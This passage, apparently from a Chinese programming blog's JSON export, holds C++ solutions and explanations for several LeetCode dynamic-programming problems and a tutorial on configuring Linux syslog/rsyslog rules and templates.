2 问题转化 在最长公共子序列超时之后，就想不到其他的解法了……\n翻阅题解发现，此前少考虑了一个条件：target 数组中的元素 互不相同 。\n这是什么意思呢？我们似乎可以用某种映射来处理 target 数组中的元素啊。\n我们发现，在 arr 数组中，可以用 下标 来代表 target 数组中的元素。\n例如题目给出的示例2， target = [6,4,8,1,3,2] ， arr = [4,7,6,2,3,8,6,1] 。那么对于既出现在 target 数组中、又出现在 arr 数组中的元素 6,4,8,1,3,2 来说，我们直接在 arr 数组中将它们改写为这些元素在 target 数组中的下标，即使得 arr = [1,?,0,5,4,2,0,3] 。\n我们要求这两个数组的最长公共子序列，这个子序列在 target 数组中是从前往后的，相当于是在转换后的 arr 数组中求得一个 最长递增 的序列。\n对于像 7 这样只出现在 arr 数组中、不出现在 target 数组中的元素，它不可能出现在最长公共子序列中，也因此不应该放入最长递增序列的考虑范围，我们随便将它改为某个特定的值，在考虑最长递增序列的时候判断一下即可。\n那么，我们应该如何求最长递增子序列呢？\n2.1 最长递增子序列：DP 最长递增子序列的模板题可以看 300. 最长递增子序列 - 力扣（LeetCode） (leetcode-cn.com) 。\n首先，最容易想到的办法肯定是DP了。我们使用数组 dp[i] 表示以第 i 个元素为结尾的最长递增子序列长度；那么，每考虑一位 i ，我们都要向前看 j = 0 ~ i-1 ，如果 nums[i] \u0026gt; nums[j] ，说明 nums[i] 可以直接加到这一序列上，得到的长度是 dp[j] + 1 ，所以 dp[i] = max(dp[j] + 1), j = 0~i-1且nums[i]\u0026gt;nums[j] 。\n这一思想跟 难题本 | LeetCode面试题 08.13. 堆箱子 (gitee.io) 这篇文章中使用的DP是一样的。\n使用这一思想做出来的模板是这样的：\n// LeetCode 300. 最长递增子序列 class Solution { public: int lengthOfLIS(vector\u0026lt;int\u0026gt;\u0026amp; nums) { vector\u0026lt;int\u0026gt; dp(nums.size() + 2, 1); dp[1] = 1; for (int i = 2; i \u0026lt;= nums.size(); i++) { // cout \u0026lt;\u0026lt; i \u0026lt;\u0026lt; endl;  // dp[i] = dp[i - 1];  for (int last = i - 1; last \u0026gt;= 1; last--) { if (nums[i - 1] \u0026gt; nums[last - 1]) { dp[i] = max(dp[i], dp[last] + 1); } } // cout \u0026lt;\u0026lt; i \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; dp[i] \u0026lt;\u0026lt; endl;  } int res = INT_MIN; for (int i = 1; i \u0026lt;= nums.size(); i++) res = max(res, dp[i]); return res; } }; \rPerformance1\r\n问题是，这样做法复杂度还是 O(n^2) ，无法通过我们最初的问题。\n2.2 最长递增子序列：贪心+二分 考虑一个简单的贪心，如果我们要使上升子序列尽可能的长，则我们需要让序列上升得尽可能慢，因此我们希望每次在上升子序列最后加上的那个数尽可能的小。\n这样，我们使用一个数组 rec 来维护当前序列，如果一个数 nums[i] \u0026gt; rec.back() ，说明这个数可以直接放入序列中而不影响序列的递增性质，非常好；而如果 nums[i] \u0026lt; rec.back() ，那么我们应该去 rec 中找到 第一个大于 nums[i] 的数 ，使用 nums[i] 替换它。\n上面的第二个条件看起来非常令人疑惑，实际上我们考虑这一情况的极端场景：整个 rec 数组中只有最后一个数比 nums[i] 更大。\n例如 rec = [1,2,3,4,9] ， nums[i] = 5 ，那么，我们会自然地想到将 9 替换成 5 ，因为这样做能够维持序列的递增性，而且对于之后出现的 nums[i] 来说，继续加入这一递增序列的 可能性 更高。\n更普遍地讲，我们将 rec 中第一个大于 nums[i] 的数替换成 nums[i] ，不会影响整个序列的递增性。假设被替换的数为 x ，有如下的两点：\n rec 数组中， x 之前的所有数都小于 nums[i] ，因为 x 是第一个大于 nums[i] 的数； x 之后的所有数本来就大于 x ，而 x 大于 nums[i] ，因此 x 之后的所有数都大于 nums[i] ；  可以看到，将 nums[i] 加入 rec 之后，对原有的递增性质没有任何影响；而对于之后出现的 nums[i] 来说，现在的 rec 数组已经是 尽可能小 的数组了，更容易加入到它们中间，维持递增。\n这就是贪心的思想。而对于从 rec 中找到第一个大于 nums[i] 这一任务，我们可以利用 rec 的有序性，使用二分的办法进行查找。\n这就有了如下的代码：\nclass Solution { public: int lengthOfLIS(vector\u0026lt;int\u0026gt;\u0026amp; nums) { vector\u0026lt;int\u0026gt; rec; int len = 1; rec.push_back(nums[0]); for (auto n : nums) { if (n \u0026gt; rec[len - 1]) { rec.push_back(n); len++; } else if (n \u0026lt; rec[len - 1]) { int left = 0; int right = len - 1; int mid; while (left \u0026lt;= right) { mid = (left + right) \u0026gt;\u0026gt; 1; if (rec[mid] \u0026gt;= n) right = mid - 1; else left = mid + 1; } rec[left] = n; } } return len; } }; 注意二分的边界，最终 left 应该指向第一个大于 nums[i] 的数，因此直接修改 rec[left] 即可。\n\rPerformance2\r\n3 本题终解 回到最初的问题来。\n经过问题的转化，我们知道应该将 arr 数组中出现的 target 元素转化成它们在 target 数组中的下标，然后去求 arr 数组中的最长递增子序列的长度。\n这就比较简单了。我们使用二分+贪心的办法，时间复杂度是 O(nlogn) ，应该可以AC。\nclass Solution { public: int minOperations(vector\u0026lt;int\u0026gt;\u0026amp; target, vector\u0026lt;int\u0026gt;\u0026amp; arr) { map\u0026lt;int, int\u0026gt; mp; for (int idx = 0; idx \u0026lt; target.size(); idx++) { mp[target[idx]] = idx; // target[idx] 出现的位置  } for (int i = 0; i \u0026lt; arr.size(); i++) { if (mp.count(arr[i])) { arr[i] = mp[arr[i]]; } else { arr[i] = INT_MIN; } } vector\u0026lt;int\u0026gt; rec(1, INT_MIN); int len = 0; for (auto n : arr) { if (n \u0026gt; INT_MIN \u0026amp;\u0026amp; n \u0026gt; rec[len]) { rec.push_back(n); len++; } else if (n \u0026gt; INT_MIN) { int left = 1; int right = len; while (left \u0026lt;= right) { int mid = (left + right) \u0026gt;\u0026gt; 1; if (rec[mid] \u0026gt;= n) right = mid - 1; else left = mid + 1; } rec[left] = n; } } return target.size() - len; } }; \rPerformance3\r\n参考资料 [1] 力扣官方题解.得到子序列的最少操作次数[EB/OL].2021-07-25\n得到子序列的最少操作次数 - 得到子序列的最少操作次数 - 力扣（LeetCode） (leetcode-cn.com)\n[2] 力扣官方题解.最长上升子序列[EB/OL].2020-03-13\n最长上升子序列 - 最长递增子序列 - 力扣（LeetCode） (leetcode-cn.com)\n","date":"2021-08-02T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode1713.-%E5%BE%97%E5%88%B0%E5%AD%90%E5%BA%8F%E5%88%97%E7%9A%84%E6%9C%80%E5%B0%91%E6%93%8D%E4%BD%9C%E6%AC%A1%E6%95%B0/","title":"难题本 | LeetCode1713. 得到子序列的最少操作次数"},{"content":"这道题有点难，但并不是完全难。\n题目 堆箱子。给你一堆n个箱子，箱子宽 wi、深 di、高 hi。箱子不能翻转，将箱子堆起来时，下面箱子的宽度、高度和深度必须大于上面的箱子。实现一种方法，搭出最高的一堆箱子。箱堆的高度为每个箱子高度的总和。\n输入使用数组 [wi, di, hi]表示每个箱子。\n示例1\n 输入： box = [[1, 1, 1], [2, 2, 2], [3, 3, 3]] 输出： 6  示例2\n 输入： box = [[1, 1, 1], [2, 3, 4], [2, 6, 7], [3, 4, 5]] 输出： 10  数据范围\n 箱子的数目不大于3000个。  分析 箱子有三个维度，一瞬间就让人想到了三维的DP。\n能否降低循环层数呢？我们注意到题目中所说的 下面箱子的宽度、高度和深度必须大于上面的箱子 ，那么，只需要根据任意一个维度进行排序，最终箱子叠起来的顺序就是排序后的顺序（正序或反序）。\n更具体地说，假如我们以宽度 w 为参照进行降序排序，则当 i \u0026lt; j 时，第 i 个箱子 一定 在第 j 个箱子下面（如果它们都被选中的话），因为第 i 个箱子的宽度更大。\n这样，我们就可以少考虑一个维度了。\nsort(box.begin(), box.end(), [](const vector\u0026lt;int\u0026gt;\u0026amp; a, const vector\u0026lt;int\u0026gt;\u0026amp; b) { return a[0] \u0026gt; b[0]; }); 接着，我们考虑深度和高度。\n错解 很容易陷入传统DP的思路中：令 dp[w][h] 表示深度 d 、高 h 时所能取得的最大高度，则令最外层箱子下标从 0 到 box.size() - 1 循环，每一次循环都令深度和高度从 1 到 maxDepth or maxHeight 进行循环，那么当前这一箱子，面对深度 d 和高度 h 的时候，取得 dp[d][h] = max(dp[d][h], dp[box[idx][1]][box[idx][2]] + box[idx][2]) 。\n理论上，这一状态转换公式来源于一个事实，即当前这一箱子有两种选择：\n 放上去：则留给上一个箱子的空间只剩下 box[idx][1] 的深度，以及 box[idx][2] 的高度，上一个箱子利用这两个数值取到的最大高度是 dp[box[idx][1]][box[idx][2]] ，加上当前箱子本身的高度 box[idx][2] 即为这一方案最终取得的高度； 不放上去：则留给上一个箱子的空间不变。  利用这一思路写出如下的代码：\nclass Solution { public: int pileBox(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; box) { int maxWidth = INT_MIN; int maxDepth = INT_MIN; int maxHeight = INT_MIN; for (auto b : box) { maxDepth = max(maxDepth, b[1]); maxHeight = max(maxHeight, b[2]); } sort(box.begin(), box.end(), [](const vector\u0026lt;int\u0026gt;\u0026amp; a, const vector\u0026lt;int\u0026gt;\u0026amp; b) { return a[0] \u0026lt; b[0]; }); int dp[maxDepth + 2][maxHeight + 2]; memset(dp, 0, sizeof(dp)); for (int idx = 0; idx \u0026lt; box.size(); idx++) { for (int d = maxDepth + 1; d \u0026gt;= 1; d--) { for (int h = maxHeight + 1; h \u0026gt;= 1; h--) { if (box[idx][1] \u0026lt; d \u0026amp;\u0026amp; box[idx][2] \u0026lt; h) { dp[d][h] = max(dp[d][h], dp[box[idx][1]][box[idx][2]] + box[idx][2]); } } } } return dp[maxDepth + 1][maxHeight + 1]; }; 这个代码的问题在于：题目中要求的是下方箱子的各项数值必须 严格大于 上方的箱子。尽管我们进行了排序，相邻箱子的 宽度 仍然可能是相同的！在状态转移的过程中，我们考虑了上一个箱子的深度和高度都严格小于当前箱子，却遗漏了它的宽度。\n这就使得我们取到的 dp[box[idx][1]][box[idx][2]] + box[idx][2] 可能同时将当前箱子和上一个箱子都堆上了，而当前箱子与上一个箱子在宽度上是相同的。\n这一情况体现在用例 2 中，对宽度进行排序，这一代码将输出答案 12 ，表示将 [1,1,1] 、 [2,3,4] 和 [2,6,7] 这三个箱子都堆上了；而，尽管 [2,3,4] 和 [2,6,7] 在深度和高度上递增，却在宽度上相同，我们的代码无法考虑这一情形。\n正解 有一说一，陷入了错解的思路之后，很难自拔，正解来源于题解。\n我们需要改变 dp 数组的含义，现在，令它作为一个一维数组， dp[i] 表示将第 i 个箱子置顶时，取得的最大高度。\n我们还是将宽度 降序排序 ，如果希望将第 i 个箱子置顶，那么它底下的箱子只可能出现在 0 ~ i - 1 的下标范围内。\n每次考虑到一个 i 时，我们就向前遍历 0 ~ i - 1 号箱子，如果某个箱子满足三个维度都大于当前的 i 号箱子，则可以得到一个 dp[n] + box[i][2] 的方案，含义是将第 n 号箱子置顶时的最大高度，加上现在的第 i 号箱子的高度。\n这一方法简直是很直观了，但是需要扣几个细节：\n dp[0] 显然是第 0 号箱子 置顶 时的最大高度，当前箱子有没有可能不放在任何箱子上呢？当然可能。因此，遍历完 0 ~ i - 1 号箱子之后，还要将取得的最大方案与 box[i][2] 进行比较； 最终返回的答案可不是 dp[box.size() - 1] ！有悖于传统的DP方案，这里的 dp[box.size() - 1] 表示将最后一个箱子置顶时的最大高度，然而最后一个箱子可不一定要被选中，我们应该遍历所有箱子，取得最大值。  AC代码 class Solution { public: int pileBox(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; box) { if (!box.size()) return 0; sort(box.begin(), box.end(), [](const vector\u0026lt;int\u0026gt;\u0026amp; a, const vector\u0026lt;int\u0026gt;\u0026amp; b) { return a[0] \u0026gt; b[0]; }); // dp[i] 表示将第i个箱子放在顶部能够取得的最大的高度  // dp[i] = max(dp[n] + box[i][2])  vector\u0026lt;int\u0026gt; dp(box.size(), 0); dp[0] = box[0][2]; for (int i = 1; i \u0026lt; box.size(); i++) { // cout \u0026lt;\u0026lt; box[i][0] \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; box[i][1] \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; box[i][2] \u0026lt;\u0026lt; endl;  for (int n = i - 1; n \u0026gt;= 0; n--) // 遍历所有可能的底部  { // cout \u0026lt;\u0026lt; \u0026#34;\\t\u0026#34; \u0026lt;\u0026lt; box[n][0] \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; box[n][1] \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; box[n][2] \u0026lt;\u0026lt; endl;  if (box[n][0] \u0026gt; box[i][0] \u0026amp;\u0026amp; box[n][1] \u0026gt; box[i][1] \u0026amp;\u0026amp; box[n][2] \u0026gt; box[i][2]) { dp[i] = max(dp[i], dp[n] + box[i][2]); } } dp[i] = max(dp[i], box[i][2]); // 表示第 i 号箱子不放在任何箱子顶上  } int res = INT_MIN; // 答案不是 dp[box.size() - 1] ！要循环取得最大值  for (int i = 0; i \u0026lt; box.size(); i++) { res = max(dp[i], res); } return res; } }; 参考资料 [1] ffreturn.08.13 c++几乎双百的暴力动态规划[EB/OL].2021-06-01\n08.13 c++几乎双百的暴力动态规划 - 堆箱子 - 力扣（LeetCode） (leetcode-cn.com)\n[2] knight.【猎豹题解日记】动态规划、回溯两种解法[EB/OL].2020-07-08\n【猎豹题解日记】动态规划、回溯两种解法 - 堆箱子 - 力扣（LeetCode） (leetcode-cn.com)\n","date":"2021-07-17T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode%E9%9D%A2%E8%AF%95%E9%A2%98-08.13.-%E5%A0%86%E7%AE%B1%E5%AD%90/","title":"难题本 | LeetCode面试题 08.13. 堆箱子"},{"content":"断更了将近两个月？\n五月下旬开始参加实习，工作颇为忙碌，单程一小时的通勤也磨灭了我回到宿舍之后继续学习和输出的热情；然而实习已近两月，所幸稍有所得，不做记录则恐愧对时光矣。\nsyslog工作流程简述 不管是什么应用，日志机制永是最重要的机制之一，从日志中，维护人员可以排查错误、发现攻击，从而有效地提高应用的可用性。\n操作系统也是如此，本文将对Linux日志机制中的一个重要组成部分——syslog/rsyslog——进行一个简要的叙述。\n大部分Linux发行版默认的日志守护进程为syslog（或较新版本的rsyslog），位于 /etc/syslog 或 /etc/syslogd 或 /etc/rsyslog.d ，默认配置文件为 /etc/syslog.conf 或 rsyslog.conf ，任何希望生成日志的程序都可以向syslog发送信息。\nsyslog应该对接收的信息进行某种处理。我们可以从直觉出发，考虑一下syslog收到一条信息后应该做哪些事情：首先，系统中有那么多的信息源，我们会考虑对这些信息源进行分类；之后，每个信息源给出的信息都具有不同的情境，正常运行产生的信息跟报错信息肯定不能一视同仁的，我们会考虑根据信息的严重性对这些信息进行分类；最后，符合筛选条件的信息就触发某种动作，比如把它写进某个日志文件里。\n流程图是个好东西。我们假设系统中有若干类信息源，每类信息源产生不同等级的信息，那么syslog应该对这些信息进行分类分级处理，如下图所示：\n\rsyslog处理分类分级处理信息\r\n当然，这一流程图只是为了较为直观地呈现syslog分类分级的机制，以使读者有个初步的印象，接下来，我们将从配置文件出发，介绍syslog（rsyslog）的日志记录细节。\n过滤规则 如果你的系统是CentOS，可以打开 /etc/rsyslog.conf ，这是syslog的配置文件，Ubuntu下的配置文件位于 /etc/rsyslog.d/50-default.conf ；在这里，你可以看到不少类似下方的语句：\nauthpriv.* /var/log/secure\n这是syslog日志记录的一条规则，我们将规则拆开来看，实际上只有三个部分：\n\r规则的组成\r\n第一个部分是facility（设备类型），第二个部分是priority（优先级/严重性），第三个部分是action（动作）。\n你应该能够想到，这一条规则就描述了上文所说的对消息进行分类分级处理的过程！\n仔细看看配置文件吧，每一条规则都是如此的简单而实用：\n#### RULES #### # Log all kernel messages to the console. # Logging much else clutters up the screen. #kern.* /dev/console # Log anything (except mail) of level info or higher. # Don\u0026#39;t log private authentication messages! *.info;mail.none;authpriv.none;cron.none /var/log/messages # The authpriv file has restricted access. authpriv.* /var/log/secure # Log all the mail messages in one place. mail.* -/var/log/maillog # Log cron stuff cron.* /var/log/cron # Everybody gets emergency messages *.emerg :omusrmsg:* facility 规则的第一部分facility指的是消息源设备的类型。syslog体系中已经将Linux中的大部分进程进行了合理的分类，例如与内核消息相关的 kern 类型、与授权信息相关的 auth/authpriv 类型等等，官方为我们总结出了如下的表格：\n\rfacilities\r\npriority和selector 将消息源设备进行分类之后，就需要看看这条消息对应的是什么级别，priority（或者叫severity）就用来表示消息的严重性。\n\rSeverities\r\nfacility + priority的形式能够唯一确定一条消息的种类，因此被称为 选择器（selector） 。正如我们所看到的规则那样，使用 facility.priority 的形式来指定一个选择器。其中，在不特别指定的情况下，选中的是 facility 设备类型所产生的 priority 级别及以上的消息，也就是说，一个 kern.info 选择器不仅能选中 kern 类型的 info 级别消息，还能选中 info 以上的所有级别。\n例如 kernel 进程产生了一条严重性为 warning 的信息，那么这条信息就将被 kern.info 或 kern.notice 等规则选中。\n除了基本的选择器用法，rsyslog在syslog的基础上扩展了一些选择器的语法。例如使用符号 = 可以 严格选中 某一优先级的消息，使用符号 ! 可以选中 除了 某一优先级的所有消息，最常用的 * 号表示这一字段的 所有取值 ，字段 none 常常配合 * 号使用，表示不记录某些facility的消息。还有一些使用表达式构造的选择器，在此不加叙述（因为在Linux默认配置中本身就用得不多），读者可以阅读文末给出的参考资料[1]来进行扩展学习。\naction 最后，是规则的最后一部分——动作（action）。这一部分的内容可以有较多的玩法，一般来说，我们使用两种操作：\n action字段写上一个文件名。如默认配置文件中的多数规则，这表示将选择器选中的消息记录到目标文件上。 action字段形如 @\u0026lt;IP\u0026gt;:\u0026lt;端口\u0026gt; ，这表示将选择器选中的消息 转发 到目标服务器的目标端口上。一个 @ 号表示使用UDP协议发送（默认），两个 @ 号表示使用TCP协议发送。例如我们配置一条规则 *.* @@192.168.0.1:514 表示将所有类型的、所有级别的消息都转发到服务器 192.168.0.1 的 514 端口。  至此，我们就了解了规则的含义，顺带地，你可以初步读懂Linux日志配置文件里的部分内容了。从这些规则出发，你能够对Linux系统下的一些日志文件有更深入的了解。我们再来看一下这些规则：\n*.info;mail.none;authpriv.none;cron.none /var/log/messages # 这条规则表示将除了 mail、authpriv、cron 的类型之外的所有设备类型的消息记录到 /var/log/messages 文件中 # 因此，你可以在 /var/log/message 文件中找到大部分日志消息 authpriv.* /var/log/secure # 这条规则表示将 authpriv 类型的所有级别消息记录到 /var/log/secure 文件中 # 因此，你应该在 /var/log/secure 文件中查看与授权信息相关的日志（如sshd登录记录，sudo认证记录等） mail.* -/var/log/maillog cron.* /var/log/cron 可以看到，上面三条规则的facility是互补的，把这几个文件综合起来看，相当于使用了 *.* 的选择器（info 级别已经和 * 差不多了），也就是说，你基本可以在上面的四个文件中查看到Linux系统产生的所有消息。\n模板Template 阅读至此，我们能够把任何需要的消息用我们希望的办法进行记录或转发，但仅仅采用默认的格式可能还远远不够。\n正常情况下，一条Linux日志长成这样：\nJul 2 23:30:03 localhost su: pam_unix(su:session): session opened for user root by xr_g(uid=0) 这一条日志分为几个部分： [时间戳] [主机名] [进程名和进程ID] [消息体] 。\n这可不是我瞎说的，因为rsyslog在记录日志的时候使用了默认的 模板 。\n如果你使用过Django或者什么其他的后端编程框架，很可能已经了解了模板的概念；如果你没接触过模板，不妨简单地将其看作一种 格式 ，就像你写论文时候的格式要求那样，所有的消息都要按照这种格式进行记录。而与你写论文时相同，论文模板里总是会指定一些较为宽泛的 属性 ，比如开头要写上摘要和关键字，所有人的论文都是相同的结构，但摘要和关键字的具体内容就因人而异了。\n日志的模板也正是如此，一条模板指定了日志的大致结构，就像上面提到的那样；而这一结构由一个一个的属性组成，日志守护进程需要根据这些属性往模板里填充数据，从而产生一条具体的日志。\n模板的定义 模板的定义办法有新旧两种，我个人比较习惯旧式的模板定义办法：\n# $template [模板名] [模板格式] $template MyTmp,\u0026#34;%timestamp% %hostname% %syslogfacility-text% %syslogseverity-text% %msg%\\n\u0026#34; 而新版的模板定义办法有若干个，例如：\ntemplate(name=\u0026#34;tpl3\u0026#34; type=\u0026#34;string\u0026#34; string=\u0026#34;%TIMESTAMP:::date-rfc3339% %HOSTNAME% %syslogtag%%msg:::sp-if-no-1st-sp%%msg:::drop-last-lf%\\n\u0026#34; ) 模板的使用 定义好了自己的模板之后，可以直接将模板应用在action字段上，具体办法就是在action原本的内容后加一个分号 ; ，然后写上自己的模板名。\n例如修改 /var/log/message 内容为我们自定义的格式：\n# Step1 设置模板，使用模板 [root@localhost log]# cat /etc/rsyslog.conf  ··· $template MyTmp,\u0026#34;%timestamp% %hostname% %syslogfacility-text% %syslogseverity-text% %msg%\\n\u0026#34; ··· *.info;mail.none;authpriv.none;cron.none /var/log/messages;MyTmp # 注意这里！！！！ # Step2 重启rsyslog服务 [root@localhost log]# systemctl restart rsyslog # Step3 观察日志内容的变化 [root@localhost log]# tail /var/log/messages  ··· Jul 2 23:57:55 localhost daemon info Stopped System Logging Service. Jul 2 23:57:55 localhost daemon info Starting System Logging Service... ··· rsyslog给出了一些模板中可用的属性，此处列出几个常用的属性，详细信息可以查看参考资料[2]。\n   属性 含义     %timestamp% 时间戳，格式为默认为 MMM dd HH:mm:ss   %syslogtag% 消息的标签，一般为 进程名[进程ID] 的形式，如 sshd[1234]   %msg% 原程序发送的消息内容，这一字段由原始进程自行定义，一般各不相同   %fromhost-ip% 一般用于远程接收日志的服务器上，获取日志发送方的IP   %syslogfacility-text% 以文字形式打印出facility   %syslogseverity-text% 以文字形式打印出severity   %hostname% 主机名    我们需要为自定义的模板命名，当然，不能与系统默认保留的一些模板重名，比如下面几个系统自带的模板：\ntemplate(name=\u0026#34;RSYSLOG_TraditionalForwardFormat\u0026#34; type=\u0026#34;string\u0026#34; string=\u0026#34;\u0026lt;%PRI%\u0026gt;%TIMESTAMP% %HOSTNAME% %syslogtag:1:32%%msg:::sp-if-no-1st-sp%%msg%\u0026#34;) template(name=\u0026#34;RSYSLOG_ForwardFormat\u0026#34; type=\u0026#34;string\u0026#34; string=\u0026#34;\u0026lt;%PRI%\u0026gt;%TIMESTAMP:::date-rfc3339% %HOSTNAME% %syslogtag:1:32%%msg:::sp-if-no-1st-sp%%msg%\u0026#34;) 更多的内容可以阅读参考资料[3]。\n注意上面给出的第一个系统模板 RSYSLOG_TraditionalForwardFormat ，这正是Linux系统中默认的日志格式，现在你明白前面我们对系统日志的格式解释是从何而来的了。\n小结 在实际工作中，syslog还有一些其他的玩法（如配置远程转发，日志模板的进阶使用等），在此就不予介绍了，之后有时间再开一篇。\n本文介绍了Linux日志机制的一个重要依赖——syslog/rsyslog，通过对日志配置文件、规则含义等的简要叙述，相信读者能够对Linux日志的机制有一个初步的理解，通过这些日志，你将能够揭开系统运行状态的面纱，更高效地排除错误，更快乐地生活。\n参考资料 [1] Filter Conditions — rsyslog 8.18.0.master documentation\n[2] RSyslog Documentation - properties - rsyslog\n[3] RSyslog Documentation - templates - rsyslog\n","date":"2021-07-03T00:00:00Z","permalink":"https://xrg.fj.cn/p/syslog%E6%9C%BA%E5%88%B6%E7%AE%80%E8%BF%B0/","title":"syslog机制简述"},{"content":"难题本为数不多的Hard题~\n题目 给你一个 m x n 的矩阵 matrix 和一个整数 k ，找出并返回矩阵内部矩形区域的不超过 k 的最大数值和。\n题目数据保证总会存在一个数值和不超过 k 的矩形区域。\n示例1\n\r\n 输入： matrix = [[1,0,1],[0,-2,3]], k = 2 输出： 2 解释： 蓝色边框圈出来的矩形区域 [[0, 1], [-2, 3]] 的数值和是 2，且 2 是不超过 k 的最大数字（k = 2）。  示例2\n 输入： matrix = [[2,2,-1]], k = 3 输出： 3  数据范围\n m == matrix.length n == matrix[i].length 1 \u0026lt;= m, n \u0026lt;= 100 -100 \u0026lt;= matrix[i][j] \u0026lt;= 100 -105 \u0026lt;= k \u0026lt;= 105  分析 我们要得到每一个小矩形，则可以：\n 遍历上下界 遍历左右界  只分析遍历上下界的情况，当我们得到了一组确定的上下界之后，我们可以得到很多个矩形区域：\n\r例：确认上下界之后的矩形区域\r\n可以看到，这个矩形区域由给定的上下界和 几个连续的列 组成。\n在这个矩形区域中，我们的总和不能超过 k 。只要我们求出每一列的总和，则可以将原问题转化为：\n 给定一个整数数组和一个整数 k，计算该数组的最大区间和，要求区间和不超过 k。\n 问题一、 如何快速求出每一列的总和呢？\n我们在最外层遍历上边界，对于递增的下边界来说，只需要在上一轮的结果中加上当前这一行的元素，即可得到每一列的总和。\n问题二、 如何快速求出不超过 k 的区间和呢？\n区间和不超过 k ，转化为公式如下：\n 对于区间 s 、区间右端 r 和区间左端 l ，使得 prefix_sum[r] - prefix_sum[l - 1] \u0026lt;= k 。\n 我们使用了前缀和 prefix_sum ，且区间左右都是闭合的。\n在本题中，我们可以从左向右遍历，计算出新的前缀和 prefix_sum[r] ，同时，我们使用一个 有序集合 保存以前计算过的所有前缀和即 prefix_sum[0 ~ l] ，从集合中快速查找是否存在一个元素满足上面的式子即可。\n说到有序集合，不得不提 set ，原式可以变化为 prefix_sum[l - 1] \u0026gt;= prefix_sum[r] - k ，即我们要找的元素正是 set.lower_bound(prefix_sum[r] - k) 。\nAC代码 class Solution { public: int maxSumSubmatrix(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; matrix, int k) { int upper, lower; int row = matrix.size(); int col = matrix[0].size(); int ans = INT_MIN; for (upper = 0; upper \u0026lt; row; upper++) { vector\u0026lt;int\u0026gt; col_sum(col); for (lower = upper; lower \u0026lt; row; lower++) { for (int c = 0; c \u0026lt; col; c++) { col_sum[c] += matrix[lower][c]; } int right = 0; set\u0026lt;int\u0026gt; s = { 0 }; set\u0026lt;int\u0026gt;::iterator left; // for each right-pos  for (int r = 0; r \u0026lt; col; r++) { // right --\u0026gt; prefix_sum[r]  right += col_sum[r]; // right - left \u0026lt;= k  // left \u0026gt;= right - k  left = s.lower_bound(right - k); if (left != s.end()) { ans = max(ans, right - *left); } s.insert(right); } } } return ans; } };  在上面的代码中，注意：\n 每列的和 col_sum 是固定了上边界之后才开始计算的，故变量定义在第一层循环内； 有序集合初始需要一个 0 ，否则计算前缀和的时候无法考虑 prefix_sum[r] 本身；   \rPerformance\r\n参考资料 [1] 力扣官方题解.矩形区域不超过 K 的最大数值和[EB/OL].2021-04-21\nhttps://leetcode-cn.com/problems/max-sum-of-rectangle-no-larger-than-k/solution/ju-xing-qu-yu-bu-chao-guo-k-de-zui-da-sh-70q2/\n","date":"2021-05-07T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode363.-%E7%9F%A9%E5%BD%A2%E5%8C%BA%E5%9F%9F%E4%B8%8D%E8%B6%85%E8%BF%87-k-%E7%9A%84%E6%9C%80%E5%A4%A7%E6%95%B0%E5%80%BC%E5%92%8C/","title":"难题本 | LeetCode363. 矩形区域不超过 K 的最大数值和"},{"content":"愉快的五四青年节从遇到一道Hard的动态规划题结束~\n题目链接：1473. 粉刷房子 III - 力扣（LeetCode） (leetcode-cn.com)\n题目 在一个小城市里，有 m 个房子排成一排，你需要给每个房子涂上 n 种颜色之一（颜色编号为 1 到 n ）。有的房子去年夏天已经涂过颜色了，所以这些房子不需要被重新涂色。\n我们将连续相同颜色尽可能多的房子称为一个街区。（比方说 houses = [1,2,2,3,3,2,1,1] ，它包含 5 个街区 [{1}, {2,2}, {3,3}, {2}, {1,1}] 。）\n给你一个数组 houses ，一个 m * n 的矩阵 cost 和一个整数 target ，其中：\nhouses[i]：是第 i 个房子的颜色，0 表示这个房子还没有被涂色。 cost[i][j]：是将第 i 个房子涂成颜色 j+1 的花费。 请你返回房子涂色方案的最小总花费，使得每个房子都被涂色后，恰好组成 target 个街区。如果没有可用的涂色方案，请返回 -1 。\n示例1\n 输入： houses = [0,0,0,0,0], cost = [[1,10],[10,1],[10,1],[1,10],[5,1]], m = 5, n = 2, target = 3 输出： 9 解释： 房子涂色方案为 [1,2,2,1,1]，此方案包含 target = 3 个街区，分别是 [{1}, {2,2}, {1,1}]。涂色的总花费为 (1 + 1 + 1 + 1 + 5) = 9。  示例2:\n 输入： houses = [0,2,1,2,0], cost = [[1,10],[10,1],[10,1],[1,10],[5,1]], m = 5, n = 2, target = 3 输出： 11 解释： 有的房子已经被涂色了，在此基础上涂色方案为 [2,2,1,2,2]，此方案包含 target = 3 个街区，分别是 [{2,2}, {1}, {2,2}]。给第一个和最后一个房子涂色的花费为 (10 + 1) = 11。  数据范围\n m == houses.length == cost.length n == cost[i].length 1 \u0026lt;= m \u0026lt;= 100 1 \u0026lt;= n \u0026lt;= 20 1 \u0026lt;= target \u0026lt;= m 0 \u0026lt;= houses[i] \u0026lt;= n 1 \u0026lt;= cost[i][j] \u0026lt;= 10^4  分析 又是一道全无思路的题目。\n显然本题需要使用动态规划，查看提示，建议我们使用一个三维数组 dp[i][j][k] ，其中 i 表示当前房子的下标， j 表示当前房子应该上的颜色， k 表示算上当前的房子一共有多少街区。 dp[i][j][k] 表示所需的最少花费。\n我们与参考文章 [1] 使用相同的办法来对这些下标进行表示：\n 房屋编号从 0 ~ m - 1 颜色编号从 0 ~ n - 1 街区编号从 0 ~ target - 1 对应颜色编号， houses 数组的值全部 减一 ，则 使用 -1 来表示原本没有上色的房子 。  已经给定了这些数据和下标的含义之后，再来进行思考就比较简单了。使用本文的代码来进行分析，对于下标 idx 的房子以及它被刷上的颜色 color 和现在已有的街区数 district ，我们发现 dp[idx][color][district] 的数值应该取决于当前房屋 和上一间房屋 的颜色，假如：\n 